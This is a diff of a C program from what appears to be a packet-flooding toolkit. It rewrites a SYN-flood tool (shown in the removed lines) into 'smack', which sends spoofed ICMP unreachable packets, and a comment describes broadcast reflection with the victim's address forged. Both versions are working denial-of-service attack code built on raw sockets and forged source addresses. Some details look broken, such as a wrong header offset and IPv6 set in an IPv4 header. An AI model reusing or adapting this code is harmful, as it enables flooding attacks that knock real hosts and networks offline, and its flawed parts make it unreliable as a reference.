@@ -2,24 +2,21 @@
 #include "ip-constructors.c"
 #include "applications.c"
 #include "constants.h"
-
+// Sends random ICMP unreachable packets from random IP's
+//http://www.iana.org/assignments/icmp-parameters/icmp-parameters.xhtml
 // Arguments standarized and checked //
 // Respects executable [[--source-addr saddr] [--[remote|broadcast]-addr raddr] [--source-port sport] [--remote-port rport] [--n N]] //
-
 int main(int argc,char* argv[]){
-	srand(time(NULL));
-    if(argc!=7){ fprintf(stdout,"Usage: syn-flood --remote-addr raddr --remote-port rport --n N"); exit(0); }
+    if(argc!=9) fprintf(stdout,"Usage: smack --source-addr saddr --remote-addr raddr --source-port sport --n N\n");
 	else{	
-		
 		/** Example source address and source port **/
-		char* source_address = generate_random_ip_v4();  // Randomize source_address for this flood //
-		char* source_port    = "1338";                   // Randomize port //
-		char* remote_address = argv[2];
-		char* remote_port    = argv[4];
-		unsigned int iter    = atoi(argv[6]);
+		char* source_address    = argv[2];
+		char* source_port       = argv[6];
+		char* remote_address    = argv[4];
+		int iterations          = atoi(argv[8]);
 
 		/** Obtain the socket**/
-		int sock = get_socket_descriptor_raw_tcp();
+		int sock = get_socket_descriptor_raw_icmp();
 		/** Create buffer for your packets **/
 		char buffer[DEFAULT_PCKT_LEN]; memset(buffer,0,DEFAULT_PCKT_LEN);
 	
@@ -29,26 +26,23 @@ int main(int argc,char* argv[]){
 
 		/** Create your headers and make your combinations **/
 		IP_HEADER *ip_hdr   = (IP_HEADER *)buffer;
-		TCP_HEADER *tcp_hdr = (TCP_HEADER *)(buffer + sizeof(IP_HEADER));
+		ICMP_HEADER *icmp_hdr = (ICMP_HEADER *)(buffer + sizeof(ICMP_HEADER));
 
-		/** Fill your headers (IP && TCP in this case) **/
+		/** Fill your headers (IP && ICMP in this case) **/
 		set_ip_header(ip_hdr,IP_VERSION_V6,IP_DEFAULT_IHL,IP_CURRENT_TOS,IP_DEFAULT_IDENTIFICATION,0,0,0,\
-			      IP_DEFAULT_FRAGMENT_OFFSET,IP_DEFAULT_TTL,IP_TCP_PROTOCOL,0,source_address,remote_address,0);
+			      IP_DEFAULT_FRAGMENT_OFFSET,IP_DEFAULT_TTL,IP_ICMP_PROTOCOL,0,source_address,remote_address,0);
 
 		/** Use auxiliar functions to warn of current status **/
 		SHOW_CREATED_IP_HEADER(ip_hdr);
 		
-		set_tcp_header(tcp_hdr,source_port,remote_port,0,0,TCP_DEFAULT_OFFSET,TCP_DEFAULT_RESERVED,0,1,0,0,0,0,0,0, \
-			       TCP_DEFAULT_WINDOW,0,0,buffer);
-		
-		SHOW_CREATED_TCP_HEADER(tcp_hdr);
+		set_icmp_header(icmp_hdr,ICMP_TYPE_UNREACHABLE,ICMP_CODE_NET_UNREACHABLE,0,0);
+		SHOW_CREATED_ICMP_HEADER(icmp_hdr);
 
 		/** Notice the kernel that we doesn't need it fill the header **/
 		if(kernel_not_fill_my_header(sock)<0){fprintf(stderr,"Is not possible to notice the kernel"); exit(0);}
 		
-		/** Run your application type (Syn flood in this case)**/
-		run_flood(sock,iter,ip_hdr,&myaddr,buffer);
-	
+		/** Application (Send icmp requests to broadcast addr with victim ip spoofed) **/
+		run_flood(sock,iterations,ip_hdr,&myaddr,buffer);
 	
 	}
 	return 0;
